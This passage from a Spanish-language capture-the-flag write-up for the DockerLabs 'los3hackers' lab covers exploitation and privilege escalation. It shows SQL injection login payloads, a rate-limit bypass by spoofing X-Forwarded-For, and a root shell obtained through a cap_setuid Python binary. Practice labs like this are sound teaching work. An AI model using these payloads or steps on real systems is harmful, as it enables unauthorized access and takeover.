## Exploitation

Probamos con una SQLi en el input `usuario` `melvin' or 1=1-- -`.

![Patrón no permitido](@images/writeups/dockerlabs/los3hackers/los3hackers-patronnopermitido.png)

Probamos con más injecciones SQL y nos bloquea por haber realizados varios intentos fallidos lo que indica que hay un rate limit.

![Rate limit](@images/writeups/dockerlabs/los3hackers/los3hackers-ratelimit.png)

Para bypasear el rate limit podemos agregar el header `X-Forwarded-For: 127.0.0.1` e ir modificando la IP para evitar que nos bloquee.

Probando con la inyección SQL `admin' --` en el input `usuario` y poniendo cualquier cosa en el de `contraseña` accedemos al panel de administrador.

## Privilege Escalation

Según el contenido del archivo hay privilegios que permanecen. Listamos las capabilities para ver si hay binarios con privilegios.

```bash
getcap / -r 2>/dev/null
```

```plaintext
/usr/local/bin/syscheck cap_setuid=ep
```

El ejecutar el binario `/usr/local/bin/syscheck` se abre Python de forma interactiva y como la capability permite modificar el UID para convertirse en cualquier otro usuario del sistema. Importamos la libreria `os`, modificamos el UID a `0` para convertirnos en `root` y ejecutamos una bash.

```bash
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")
```

Como el usuario `root` cambiamos al directorio home de `root`.

```bash
cd /root
```
